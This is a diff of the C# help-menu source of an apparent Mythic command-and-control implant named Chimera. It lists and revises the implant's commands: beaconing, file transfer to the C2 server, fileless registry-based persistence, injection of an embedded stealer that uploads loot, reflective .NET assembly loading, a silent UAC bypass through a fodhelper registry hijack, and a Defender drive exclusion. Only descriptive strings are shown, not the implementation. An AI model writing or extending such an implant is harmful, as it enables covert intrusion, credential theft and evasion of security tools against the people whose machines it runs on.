@@ -15,12 +15,14 @@ namespace Chimera.Commands
             sb.AppendLine("ls [path]                List directory contents");
             sb.AppendLine("pwd                      Print working directory");
             sb.AppendLine("cd <path>                Change working directory");
-            sb.AppendLine("upload <remote> <local>  Upload file from agent to Mythic");
+            sb.AppendLine("upload <local> [remote]  Upload file from agent to Mythic");
             sb.AppendLine("download <url> <local>   Download file from Mythic to agent");
             sb.AppendLine("sleep <seconds> [jitter] Change beacon interval");
-            sb.AppendLine("persist                  Fileless encrypted persistence (HKCU Run + blob)");
-            sb.AppendLine("run_stealer              Inject and run the embedded stealer, then uploads loot");
-            sb.AppendLine("bypass                   Silent UAC bypass + auto Defender C:\\ exclusion");
+            sb.AppendLine("persist                  Fileless XOR-encrypted persistence (HKCU Run + blob)");
+            sb.AppendLine("persist remove           Remove persistence blob and Run key");
+            sb.AppendLine("inject_assembly <b64>    Reflectively load and run a .NET assembly (base64)");
+            sb.AppendLine("run_stealer              Decrypt+run embedded stealer shellcode, upload loot");
+            sb.AppendLine("bypass [cmd]             Silent UAC elevation via fodhelper registry hijack");
             sb.AppendLine("kill                     Terminate agent process");
             sb.AppendLine("help                     Show this help");
             return sb.ToString();
